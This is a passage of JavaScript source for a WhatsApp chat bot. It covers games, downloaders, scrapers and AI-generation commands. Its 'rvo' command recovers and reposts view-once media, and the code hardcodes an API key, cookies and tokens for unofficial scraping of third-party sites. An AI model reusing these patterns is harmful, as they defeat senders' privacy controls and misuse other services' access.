      `❌ @${user.split("@")[0]}, you need $${trainingCost} to train your pet (${selectedPet.name}).`,
      { mentions: [user] }
    );
  }

  economy[user].wallet -= trainingCost;
  selectedPet.level++;
  selectedPet.strength += 5; // Increase strength per level
  saveEconomy(economy);
  savePets(pets);

  replyphistar(
    `🎉 @${user.split("@")[0]}, your *${selectedPet.name}* leveled up to Level ${selectedPet.level}!\n💪 Strength increased to ${selectedPet.strength}.\n\n💰 *Wallet Balance:* $${economy[user].wallet}`,
    { mentions: [user] }
  );
}
break;

case 'battle': {
  const opponent = m.mentionedJid?.[0];
  const user = m.sender;

  if (!opponent || opponent === user) {
    return replyphistar("❌ Usage: *battle @user*");
  }

  if (!pets[user] || pets[user].length === 0) {
    return replyphistar(`❌ @${user.split("@")[0]}, you don't have any pets. Use *buypet* to get one!`, {
      mentions: [user],
    });
  }

  if (!pets[opponent] || pets[opponent].length === 0) {
    return replyphistar(`❌ @${opponent.split("@")[0]} doesn't have any pets to battle!`, {
      mentions: [opponent],
    });
  }

  const userPet = pets[user][0]; // Use the first pet for now
  const opponentPet = pets[opponent][0]; // Use the first pet for now

  const userScore = userPet.level + userPet.strength + Math.random() * 10;
  const opponentScore = opponentPet.level + opponentPet.strength + Math.random() * 10;

  if (userScore > opponentScore) {
    replyphistar(
      `🏆 *Battle Result:*\n\n🎉 @${user.split("@")[0]}'s *${userPet.name}* defeated @${opponent.split("@")[0]}'s *${opponentPet.name}*!`,
      { mentions: [user, opponent] }
    );
  } else {
    replyphistar(
      `🏆 *Battle Result:*\n\n🎉 @${opponent.split("@")[0]}'s *${opponentPet.name}* defeated @${user.split("@")[0]}'s *${userPet.name}*!`,
      { mentions: [user, opponent] }
    );
  }
}
break;
case 'kisahnabi': {
  if (!text) return replyphistar("nama nabinya?");
  let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`);
  let kisah = await url.json().catch(_ => "Error");
  if (kisah == "Error") return replyphistar("*Not Found*\n*Try Not to Use Capital Letters*");

  let hasil = `_*Name of the Prophet :*_ ${kisah.name} 
_*Date of birth :*_ ${kisah.thn_kelahiran}
_*Place of birth :*_ ${kisah.tmp}
_*Age :*_ ${kisah.usia}

* — [ K I S A H ] — *

${kisah.description}`;

  replyphistar(hasil);
}
break;

case 'prodia': {
  if (!q) return replyphistar(`query?`);
  async function prodia(query) {
    const headers = {
      'user-agent': 'Mozilla/5.0 (Linux; Android 11; Avosky) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36'
    };
    try {
      const AvoskyX = await axios.get('https://api.prodia.com/generate', {
        params: {
          "new": "true",
          "prompt": query,
          "model": "dreamshaper_6BakedVae.safetensors [114c8abb]",
          "steps": "50",
          "cfg": "9.5",
          "seed": Math.floor(Math.random() * 10000) + 1,
          "sampler": "Euler",
          "aspect_ratio": "square"
        },
        headers,
        timeout: 30000
      });
      const avos = AvoskyX.data;
      let AvoskyNih;
      do {
        const syra = await axios.get(`https://api.prodia.com/job/${avos.job}`, { headers });
        AvoskyNih = syra.data;
      } while (AvoskyNih.status !== 'succeeded');
      const imageUrl = `https://images.prodia.xyz/${avos.job}.png?download=1`;
      PhistarBotInc.sendMessage(m.chat, { image: { url: imageUrl }, caption: '_donee_.' });
    } catch (error) {
      replyphistar('Error');
    }
  }
  prodia(`${q}`);
}
break;

case 'tempmail': {
  try {
    const res = await axios.get(`https://apis.phistar.my.id/temp-mail`);
    const data = res.data;

    if (!data.success) return replyphistar(`❌ Failed to generate temp mail.`);

    global.tempMailSession = data.session_id;

    replyphistar(`✅ *Temporary Mail Created!*\n\n` +
      `• Email: ${data.email}\n` +
      `• Session ID: ${data.session_id}\n` +
      `• Expires: ${data.expires_at}\n\n` +
      `Use *${prefix}tempmail-inbox ${data.session_id}* to check inbox.`);
  } catch (err) {
    console.error(err);
    replyphistar(`❌ Error creating temp mail:\n> ${err.message}`);
  }
}
break;

case 'tempmail-inbox': {
  if (!args[0]) return replyphistar(`❌ Provide a valid session ID.\n*Example:* ${prefix}tempmail-inbox U2Vzc2lvbjox23abc`);

  try {
    const sessionId = args[0];
    const res = await axios.get(`https://apis.phistar.my.id/temp-mail/inbox?id=${sessionId}`);
    const data = res.data;

    if (!data.success) return replyphistar(`❌ Failed to fetch inbox.`);

    if (data.messages.length === 0)
      return replyphistar(`📭 Inbox is empty.`);

    let inboxText = data.messages.map((msg, i) =>
      `📧 *Message ${i + 1}*\n` +
      `• From: ${msg.fromAddr}\n` +
      `• To: ${msg.toAddr}\n` +
      `• Size: ${msg.rawSize} bytes\n` +
      `• Text: ${msg.text ? msg.text.substring(0, 300) + '...' : 'No preview'}\n` +
      `• Download: ${msg.downloadUrl}`
    ).join('\n\n');

    replyphistar(`*📬 Temp Mail Inbox*\n\n${inboxText}`);
  } catch (err) {
    console.error(err);
    replyphistar(`❌ Error checking inbox:\n> ${err.message}`);
  }
}
break;

case 'npmstalk': {
  if (!text) return replyphistar("Example: .npmstalk axios");
  async function npmstalk(packageName) {
    let stalk = await axios.get("https://registry.npmjs.org/" + packageName);
    let versions = stalk.data.versions;
    let allver = Object.keys(versions);
    let verLatest = allver[allver.length - 1];
    let verPublish = allver[0];
    let packageLatest = versions[verLatest];
    return {
      name: packageName,
      versionLatest: verLatest,
      versionPublish: verPublish,
      versionUpdate: allver.length,
      latestDependencies: Object.keys(packageLatest.dependencies || {}).length,
      publishDependencies: Object.keys(versions[verPublish].dependencies || {}).length,
      publishTime: stalk.data.time.created,
      latestPublishTime: stalk.data.time[verLatest]
    };
  }
  try {
    let jut = await npmstalk(text);
    let ahwoi = `[ *NPM STALK* ]

Name: ${jut.name}
Version Latest: ${jut.versionLatest}
Version Publish: ${jut.versionPublish}
Version Update: ${jut.versionUpdate}
Latest Dependencies: ${jut.latestDependencies}
Publish Dependencies: ${jut.publishDependencies}
Publish Time: ${jut.publishTime}
Latest Publish Time: ${jut.latestPublishTime}
`;
    PhistarBotInc.sendMessage(m.chat, { text: ahwoi }, { quoted: m });
  } catch (error) {
    replyphistar(error.message);
  }
}
break;

case 'editee': {
  if (!q) return replyphistar(`_Ask App?`);
  async function getSession() {
    const res = await axios.get("https://editee.com/chat-gpt");
    return res.headers['set-cookie'] ? res.headers['set-cookie'][0].split(';')[0].split('=')[1] : null;
  }
  async function avz(query) {
    const sessionCookie = await getSession();
    const headers = {
      "content-type": "application/json",
      "cookie": `editeecom_session=${sessionCookie}`,
      "user-agent": "Mozilla/5.0",
      "x-requested-with": "XMLHttpRequest"
    };
    const response = await axios.post("https://editee.com/submit/chatgptfree", {
      context: " ",
      selected_model: "gemini",
      important: `aV77OsKy`,
      user_input: query
    }, { headers });
    return response.data;
  }
  try {
    const answer = await avz(q);
    replyphistar(answer.text);
  } catch (error) {
    console.error("Error:", error);
    replyphistar("Error occurred.");
  }
}
break;

case 'ttslide': {
  let input = `[!] *wrong input*
  
Ex: ${prefix + command} https://vt.tiktok.com/ZSFSqcuXb/`;

  if (!text) return replyphistar(input);

  if (!(text.includes('http://') || text.includes('https://'))) return replyphistar(`url invalid, please input a valid url. Try with add http:// or https://`);
  if (!text.includes('tiktok.com')) return replyphistar(`Invalid TikTok URL.`);

  async function tiktok(url) {
    try {
      const data = new URLSearchParams({
        'id': url,
        'locale': 'id',
        'tt': 'RFBiZ3Bi'
      });

      const headers = {
        'HX-Request': true,
        'HX-Trigger': '_gcaptcha_pt',
        'HX-Target': 'target',
        'HX-Current-URL': 'https://ssstik.io/id',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
        'Referer': 'https://ssstik.io/id'
      };

      const response = await axios.post('https://ssstik.io/abc?url=dl', data, {
        headers
      });
      const html = response.data;

      const $ = cheerio.load(html);

      const author = $('#avatarAndTextUsual h2').text().trim();
      const title = $('#avatarAndTextUsual p').text().trim();
      const video = $('.result_overlay_buttons a.download_link').attr('href');
      const audio = $('.result_overlay_buttons a.download_link.music').attr('href');
      const imgLinks = [];
      $('img[data-splide-lazy]').each((index, element) => {
        const imgLink = $(element).attr('data-splide-lazy');
        imgLinks.push(imgLink);
      });

      const result = {
        author,
        title,
        result: video || imgLinks,
        audio
      };
      return result;
    } catch (error) {
      console.error('Error:', error);
      return null;
    }
  }

  try {
    const { result } = await tiktok(text);
    if (!result) return replyphistar('Error fetching TikTok slide.');
    replyphistar('Please wait...');
    let no = 1;
    for (let i of result) {
      PhistarBotInc.sendMessage(m.sender, { image: { url: i }, caption: `Picture ${no++}` }, { quoted: m });
    }
  } catch (error) {
    replyphistar(error.toString());
  }
}
break;

case 'steamsearch': {
  if (!q) return replyphistar("Example: .steamsearch honkai impact");
  async function Steam(search) {
    return new Promise(async (resolve, reject) => {
      try {
        const { data, status } = await axios.get('https://store.steampowered.com/search/?term=' + search);
        const $ = cheerio.load(data);
        const hasil = [];
        $('#search_resultsRows > a').each((a, b) => {
          const link = $(b).attr('href');
          const judul = $(b).find(`div.responsive_search_name_combined > div.col.search_name.ellipsis > span`).text();
          const harga = $(b).find(`div.responsive_search_name_combined > div.col.search_price_discount_combined.responsive_secondrow > div.col.search_price.responsive_secondrow`).text().replace(/ /g, '').replace(/\n/g, '');
          var rating = $(b).find(`div.responsive_search_name_combined > div.col.search_reviewscore.responsive_secondrow > span`).attr('data-tooltip-html');
          const img = $(b).find(`div.col.search_capsule > img`).attr('src');
          const rilis = $(b).find(`div.responsive_search_name_combined > div.col.search_released.responsive_secondrow`).text();

          if (typeof rating === 'undefined') {
            var rating = 'no ratings';
          }
          if (rating && rating.includes('<br>')) {
            let hhh = rating.split('<br>');
            var rating = `${hhh[0]} ${hhh[1]}`;
          }
          hasil.push({
            Title: judul,
            img: img,
            link: link,
            rilis: rilis,
            harga: harga ? harga : 'no price',
            rating: rating
          });
        });
        if (hasil.every(x => x === undefined)) return resolve({ developer: '@Phistar', mess: 'no result found' });
        resolve(hasil);
      } catch (err) {
        reject(err);
      }
    });
  }
  Steam(q).then(results => {
    if (results.mess) {
      replyphistar(results.mess);
      return;
    }
    let replyTextt = `Search results for "${q}":\n\n`;
    results.forEach((hasil, index) => {
      replyTextt += `${index + 1}. ${hasil.Title}\nPrice: ${hasil.harga}\nLink: ${hasil.link}\nRelease: ${hasil.rilis}\nRating: ${hasil.rating}\n\n`;
    });
    replyphistar(replyTextt);
  }).catch(error => {
    replyphistar('An error occurred while searching for games on Steam.');
    console.error(error);
  });
}
break;
case 'sfile': {
  if (args[0] && args[0].match(/(https:\/\/sfile.mobi\/)/gi)) {
    const sfile = {
      search: async (query, page = 1) => {
        let res = await fetch(`https://sfile.mobi/search.php?q=${query}&page=${page}`);
        let $ = cheerio.load(await res.text()), arr = [];
        $('div.list').each((idx, el) => {
          let title = $(el).find('a').text(),
              size = $(el).text().trim().split(' (')[1],
              link = $(el).find('a').attr('href');
          if (link) arr.push({ title, size: size.replace(')', ''), link });
        });
        return arr;
      },
      download: async url => {
        let res = await fetch(url);
        let $ = cheerio.load(await res.text()), obj = {};
        obj.filename = $('div.w3-row-padding').find('img').attr('alt');
        obj.mimetype = $('div.list').text().split(' - ')[1].split('\n')[0];
        obj.filesize = $('#download').text().replace(/Download File/g, '').replace(/\(|\)/g, '').trim();
        obj.download = await getLink(url);
        return obj;
      }
    };

    async function getLink(url) {
      url = 'https://sfile.mobi/download' + (new URL(url)).pathname;
      let html = await (await fetch(url)).text();
      return html.split('" rel="nofollow"')[0].split('start, <a href="')[1];
    }

    let res = await sfile.download(args[0]);
    if (!res) throw 'Error';
    await replyphistar(Object.keys(res).map(v => `*• ${v.capitalize()}:* ${res[v]}`).join('\n') + '\n\n_Sending file..._');
    await PhistarBotInc.sendMessage(
      m.chat,
      {
        document: { url: res.download },
        fileName: res.filename,
        mimetype: res.mimetype,
      },
      { quoted: m }
    );
  } else if (args[0]) {
    let query = args.join` `.split`|`[0], page = parseInt(args.join` `.split`|`[1]) || 1,
        res = await sfile.search(query, page);
    if (!res.length) return replyphistar(`Query "${query}" not found`);
    res = res.map(v => `*Title:* ${v.title}\n*Size:* ${v.size}\n*Link:* ${v.link}`).join`\n\n`;
    await replyphistar(res + `\nPage: ${page}`);
  } else return replyphistar(`Enter Query Or Link!\n\nExample:\n${prefix + command} growtopia\n${prefix + command} https://sfile.mobi/1BnLYfsHEcO7`);
}
break;

case 'songai':
case 'songgen': {
  if (!text) {
    return replyphistar(`Enter text\nExample: ${prefix + command} i love Phistar`);
  }
  const api = {
    xterm: {
      url: "https://ai.xterm.codes",
      key: "Bell409"
    }
  };
  const SongGenerator = async (prompt) => {
    try {
      const { key } = await PhistarBotInc.sendMessage(m.chat, { text: "Please wait.." }, { quoted: m });
      const response = await axios({
        method: 'post',
        url: `${api.xterm.url}/api/audioProcessing/song-generator`,
        params: { prompt, key: api.xterm.key },
        responseType: 'stream'
      });
      return new Promise((resolve, reject) => {
        response.data.on('data', (chunk) => {
          try {
            const eventString = chunk.toString();
            const eventData = eventString.match(/data: (.+)/);
            if (eventData && eventData[1]) {
              const data = JSON.parse(eventData[1]);
              switch (data.status) {
                case 'queueing':
                case 'generating':
                  PhistarBotInc.sendMessage(m.chat, { text: data.msg, edit: key });
                  break;
                case 'failed':
                  response.data.destroy();
                  reject(new Error(data.msg));
                  break;
                case 'success':
                  response.data.destroy();
                  resolve(data);
                  break;
                default:
                  PhistarBotInc.sendMessage(m.chat, { text: "Unknown status: " + data, edit: key });
              }
            }
          } catch (e) {
            PhistarBotInc.sendMessage(m.chat, { text: "Error processing chunk: " + e.message, edit: key });
            response.data.destroy();
            reject(e);
          }
        });
        response.data.on('error', (err) => {
          PhistarBotInc.sendMessage(m.chat, { text: "Stream error: " + err.message, edit: key });
          reject(err);
        });
      });
    } catch (error) {
      PhistarBotInc.sendMessage(m.chat, { text: "Error: " + error.message, edit: key });
      throw error;
    }
  };
  try {
    const data = await SongGenerator(text);
    await PhistarBotInc.sendPresenceUpdate('recording', m.chat);
    await PhistarBotInc.sendMessage(m.chat, { audio: { url: data.result.audioUrl }, mimetype: "audio/mpeg", ptt: true }, { quoted: m });
    let doc = {
      text: data.result.lyrics,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          mediaType: 2,
          mediaUrl: `https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L/${Math.floor(Math.random() * 100000000000000000)}`,
          title: `${ucapanWaktu} ${m.pushName}`,
          body: `𝐏𝐇𝐈𝐒𝐓𝐀𝐑𝐁𝐎𝐓𝐈𝐍𝐂`,
          sourceUrl: "https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L",
          thumbnail: fkethmb
        }
      }
    };
    await PhistarBotInc.sendMessage(m.chat, doc, { quoted: m });
  } catch (err) {
    console.error(err);
  }
}
break;

case 'userjid': {
  if (!isCreator) return replyphistar("For My Owner Only");
  let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`;
  for (let mem of participants) {
    textt += `${mem.id}\n`;
  }
  replyphistar(textt);
}
break;

case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel': {
  try {
    let set;
    if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
    if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
    if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
    if (/earrape/.test(command)) set = '-af volume=12';
    if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
    if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
    if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
    if (/reverse/.test(command)) set = '-filter_complex "areverse"';
    if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
    if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
    if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
    if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
    if (/audio/.test(mime)) {
      let media = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);
      let ran = getRandom('.mp3');
      exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
        fs.unlinkSync(media);
        if (err) return replyphistar(err.toString());
        let buff = fs.readFileSync(ran);
        PhistarBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m });
        fs.unlinkSync(ran);
      });
    } else replyphistar(`Reply to the audio you want to change with a caption *${prefix + command}*`);
  } catch (e) {
    replyphistar(e.toString());
  }
}
break;

case 'spotify': case 'spotifysearch': {
  if (!text) return replyphistar('❌ *Spotify Search* ❌\n\nPlease enter keywords to search for songs on Spotify.');
  try {
    do2 = await searchSpotifyTracks(text);
    let ini_text = '✨ *Spotify Search* ✨';
    for (const x of do2) {
      ini_text += `\n
      •🎵 *Title:* ${x.name}
👥 *Artist:* ${x.artists.map(v => v.name).join(', ')}
👥 *Artist Album:* ${x.album.artists.map(v => v.name).join(', ')}
🆔 *ID:* ${x.id}
📅 *Album Release Date:* ${x.album.release_date}
🆔 *Album ID:* ${x.album.id}
🎵 *Album Track Count:* ${x.album.total_tracks}
🔢 *Track Number:* ${x.album.track_number}
⏳ *Duration:* ${x.duration_ms} ms
🔗 *Url:* ${x.uri}
🎵 *URL Album*: ${x.album.external_urls.spotify}\n
───────────────────
`;
    }
    replyphistar(ini_text);
  } catch (e) {
    return replyphistar('❌ *Spotify Search* ❌\n\nAn Error Occurred, Please Try Again Later.');
  }
}
break;

case 'quote': {
  if (!text || !text.includes('|')) {
    return replyphistar(`*Usage:* .quote <text>|<name>\n\n*Example:* .quote Be yourself|Albert Einstein`);
  }

  try {
    // Split the input into text and name
    const [quoteText, author] = text.split('|').map(t => t.trim());
    const font = 'Poppins-Bold'; // Default font
    let imageUrl;

    // Check if the command is replying to an image
    if (/image/.test(mime)) {
      const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);
      const uploadResponse = await uploadToImgur(mediaPath); // Use the Imgur upload function
      if (uploadResponse.status !== "success") {
        fs.unlinkSync(mediaPath); // Clean up the downloaded file
        return replyphistar(`*UPLOAD ERROR!! MESSAGE :*\n\n> ${uploadResponse.message}`);
      }
      imageUrl = uploadResponse.fileUrl; // Get the uploaded image URL
      fs.unlinkSync(mediaPath); // Clean up the downloaded file
    } 
    // If no image is replied to, use a default image
    else {
      imageUrl = 'https://cdn.popcat.xyz/popcat.png'; // Default image
    }

    // Call the Quote API
    const apiResponse = await axios.get(`https://api.popcat.xyz/quote`, {
      params: { image: imageUrl, text: quoteText, font, name: author }
    });

    if (apiResponse.status === 200) {
      const quoteImageUrl = apiResponse.request.res.responseUrl; // The URL of the generated quote image

      // Send the quote image back to the user
      await PhistarBotInc.sendMessage(m.chat, {
        image: { url: quoteImageUrl },
        caption: `*Quote Generated Successfully!*\n\n"${quoteText}"\n- ${author}`,
      }, { quoted: m });
    } else {
      replyphistar(`*QUOTE GENERATION ERROR!! MESSAGE :*\n\n> Failed to generate a quote image. Try again.`);
    }
  } catch (error) {
    console.error('Error in Quote command:', error);
    replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
  }
}
break;

case 'rvo': {
  const isQuotedViewOnce = m.message.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessageV2 ? true : false;
  if (!isQuotedViewOnce) return replyphistar('Reply viewonce');
  let type = Object.keys(m.quoted.message)[0];
  let quotedType = m.quoted.message[type];
  let media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video");
  let buffer = Buffer.from([]);
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk]);
  }
  if (/video/.test(type)) {
    await PhistarBotInc.sendMessage(m.chat, { video: buffer, caption: quotedType.caption });
  } else if (/image/.test(type)) {
    await PhistarBotInc.sendMessage(m.chat, { image: buffer, caption: quotedType.caption });
  }
}
break;

case 'pixeldrain': {
  if (!args[0])
    return replyphistar(`Input Pixeldrain URL\n${prefix + command} > Url <\n\nExample:\n${prefix + command} https://pixeldrain.com/u/HoGp3Hva\n\n Opsi kedua:\n https://pixeldrain.com/l/2xrapNPF#item=9`);

  if (!/pixeldrain.com\//.test(args[0])) return replyphistar("URL Please!!");
  function formatSize(num) {
    return `${(num / 1000 / 1000).toFixed(2)} MB`;
  }

  async function fetchFileData(id) {
    const response = await axios.get(
      `https://pixeldrain.com/api/file/${id}/info`
    );
    const json = response.data;
    const download = `https://pixeldrain.com/api/file/${id}?download`;
    return { download, ...json };
  }

  async function scrapeListData(url) {
    try {
      const response = await axios.get(url);
      const html = response.data;
      const $ = cheerio.load(html);

      const scriptContent = $("script")
        .toArray()
        .map((script) => $(script).html())
        .find((content) => content.includes("window.viewer_data"));

      if (scriptContent) {
        const viewerDataString = scriptContent.match(
          /window.viewer_data\s*=\s*({.*?});/
        )[1];
        const viewerData = JSON.parse(viewerDataString);

        const data = viewerData.api_response.files.map((file) => ({
          title: file.name,
          id: file.id,
        }));

        return data;
      } else {
        console.error("window.viewer_data not found");
        return [];
      }
    } catch (error) {
      console.error("Error fetching the page:", error);
      return [];
    }
  }

  const url = args[0];
  const fileIdMatch = url.match(/\/u\/(\w+)/);
  const listIdMatch = url.match(/\/l\/(\w+)/);

  if (fileIdMatch) {
    const id = fileIdMatch[1];
    const fileData = await fetchFileData(id);
    const formattedSize = formatSize(fileData.size);
    const sizeMatch = formattedSize.match(/^([\d.]+)\s*(GB|MB)$/i);

    if (!sizeMatch) {
      return replyphistar("Unknown file size unit.");
    }

    const size = parseFloat(sizeMatch[1]);
    const unit = sizeMatch[2].toUpperCase();
    let sizeInMB;

    if (unit === "GB") {
      sizeInMB = size * 1024;
    } else if (unit === "MB") {
      sizeInMB = size;
    } else {
      return replyphistar("Unknown file size unit.");
    }

    const w = "`";

    let message =
      `PixelDrain Downloader\n\n- Name: ${fileData.name}\n` +
      `- Size: ${formattedSize}\n` +
      `- Views: ${fileData.views}\n` +
      `- Downloads: ${fileData.downloads}\n` +
      `- Uploaded: ${fileData.date_upload.split("T")[0]}\n` +
      `- Type: ${fileData.mime_type}\n\n_Sedang Mengirim File..._`;
    await replyphistar(message);

    await PhistarBotInc.sendMessage(
      m.chat,
      {
        document: { url: fileData.download },
        fileName: fileData.name,
        mimetype: fileData.mime_type,
      },
      { quoted: m }
    );
  } else if (listIdMatch) {
    PhistarBotInc.pixpix = PhistarBotInc.pixpix || {};
    const listData = await scrapeListData(url);
    if (listData.length === 0) return replyphistar("No files found.");

    const fileList = listData.map((item, index) => ({
      title: item.title,
      id: item.id,
    }));

    const fileListText = fileList
      .map((item, index) => `${index + 1}. ${item.title}`)
      .join("\n");
    const { key } = await replyphistar(`Result List:\n\n${fileListText}\n\nReply to this message with the number, link you want to display.`);
    PhistarBotInc.pixpix[m.chat] = {
      list: fileList,
      key,
      timeout: setTimeout(
        () => {
          PhistarBotInc.sendMessage(m.chat, { delete: key });
          setTimeout(() => {
            delete PhistarBotInc.pixpix[m.chat];
          }, 60 * 1000);
        },
        5 * 60 * 1000
      ),
    };
  } else {
    return replyphistar("URL Please!!");
  }
}
break;

case 'gdrive': {
  if (!text) return replyphistar(`Example ${prefix + command} url`);
  async function GDriveDl(url) {
    let id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))?.[1];
    if (!id) return replyphistar('ID Not Found');
    let res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
      method: 'post',
      headers: {
        'accept-encoding': 'gzip, deflate, br',
        'content-length': 0,
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://drive.google.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
        'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
        'x-drive-first-party': 'DriveWebUi',
        'x-json-requested': 'true'
      }
    });
    let { fileName, sizeBytes, downloadUrl } = JSON.parse((await res.text()).slice(4));
    if (!downloadUrl) return replyphistar('Link Download Limit!');
    let data = await fetch(downloadUrl);
    if (data.status !== 200) throw data.statusText;
    return {
      downloadUrl,
      fileName,
      fileSize: (sizeBytes / 1024 / 1024).toFixed(2),
      mimetype: data.headers.get('content-type')
    };
  }
  try {
    let kanjuttgede = await GDriveDl(text);
    let bjirrbang = `*Google Drive*\n\nName: ${kanjuttgede.fileName}\nLink: ${kanjuttgede.downloadUrl}`;
    replyphistar(bjirrbang);
    await PhistarBotInc.sendMessage(m.chat, { document: { url: kanjuttgede.downloadUrl }, fileName: kanjuttgede.fileName, mimetype: kanjuttgede.mimetype }, { quoted: m });
  } catch (error) {
    replyphistar(`${error.message}`);
  }
}
break;

case 'morphic': {
  if (!text) return replyphistar(`Example: ${prefix + command} hai`);
  async function morphic(query) {
    const url = 'https://www.morphic.sh/';
    const formData = new FormData();
    
    formData.append('1', JSON.stringify({ id: '6399a7e212fa477d1a783edade27c8354a64e1ab', bound: null }));
    formData.append('2', JSON.stringify({ id: '9eed8f3e1c51044505fd5c0d73e8d2a92572691c', bound: null }));
    formData.append('3_input', query);
    formData.append('3_include_images', 'true');
    formData.append('0', JSON.stringify([{"action":"$F1","options":{"onSetAIState":"$F2"}},{"chatId":"9TI931x","messages":[]},"$K3",false,"$undefined","$undefined"]));

    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
          Accept: 'text/x-component',
          'Accept-Language': 'en-US,en;q=0.5',
          'Accept-Encoding': 'gzip, deflate, br, zstd',
          Referer: 'https://www.morphic.sh/',
          'Next-Action': 'c54d85c7f9588581807befbe1a35958acc57885b',
          'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2F%22%2C%22refresh%22%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
          Origin: 'https://www.morphic.sh',
          Connection: 'close',
          Cookie: 'ph_phc_HK6KqP8mdSmxDjoZtHYi3MW8Kx5mHmlYpmgmZnGuaV5_posthog=%7B%22distinct_id%22%3A%220191839d-890a-7a97-b388-bc7191ac7047%22%2C%22%24sesid%22%3A%5B1724490025781%2C%220191839d-8909-72e8-b586-d66ff3bde34f%22%2C1724490025225%5D%7D',
          Priority: 'u=0',
          TE: 'trailers'
        },
        body: formData
      });

      const data = await response.text();

      const regex = /"diff":\[0,"([^"]+)"\]/g;
      let result;
      let finalText = "";

      while ((result = regex.exec(data)) !== null) {
        finalText += result[1];
      }

      return finalText;
    } catch (error) {
      console.error('Error:', error);
      throw error;
    }
  }
  try {
    let hannpler = await morphic(text);
    PhistarBotInc.sendMessage(m.chat, { text: hannpler }, { quoted: m });
  } catch (error) {
    replyphistar("Error!!!");
  }
}
break;

case 'pixiv': {
  if (!text) return replyphistar(`Example: ${prefix + command} harimau`);
  async function pixiv(word) {
    var { get } = require("axios");
    const url = 'https://www.pixiv.net/touch/ajax/tag_portal';
    const params = { word, lang: 'en', version: 'b355e2bcced14892fe49d790ebb9ec73d2287393' };
    const headers = {
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
      'Referer': 'https://www.pixiv.net/',
      'Accept-Encoding': 'gzip, deflate, br'
    };
    const { data } = await get(url, { params, headers });
    const illusts = data.body.illusts;
    const random = illusts[Math.floor(Math.random() * illusts.length)].url;
    const image = await axios.get(random, { responseType: 'arraybuffer', headers });

    return image.data;
  }
  replyphistar('Please wait...');
  let hannunibakwan = await pixiv(text);
  await PhistarBotInc.sendMessage(m.chat, { image: hannunibakwan, caption: "Done" }, { quoted: m });
}
break;

case 'playstore': {
  let [tema, urutan] = text.split(/[^\w\s]/g);
  if (!tema) return replyphistar("Input query!\n*Example:*\n.playstore [query]|[number]");
  replyphistar('Please wait...');
  async function playstore(query) {
    let html = (await axios.get(`https://play.google.com/store/search?q=${query}&c=apps`)).data;
    let $ = cheerio.load(html);
    return $("div.VfPpkd-aGsRMb").get().map(x => {
      return {
        title: $(x).find("span.DdYX5").text(),
        rating: $(x).find("span.w2kbF").text(),
        author: $(x).find("span.wMUdtb").text(),
        thumbnail: $(x).find(".j2FCNc img").attr("src").replace("s64", "s256"),
        link: "https://play.google.com" + $(x).find("a.Si6A0c").attr("href")
      };
    });
  }
  try {
    let data = await playstore(tema);
    if (!urutan) return replyphistar("Input query!\n*Example:*\n.playstore [query]|[number]\n\n*Select the existing numbers*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"));
    if (isNaN(urutan)) return replyphistar("Input query!\n*Example:*\n.playstore [query]|[number]\n\n*Select the existing numbers*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"));
    if (urutan > data.length) return replyphistar("Input query!\n*Example:*\n.playstore [query]|[number]\n\n*Select the existing numbers*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"));
    let out = data[urutan - 1];
    let caption = `*I N F O R M A T I O N*

*Application Title:* ${out.title || "-"}
*Link:* ${out.link || "-"}
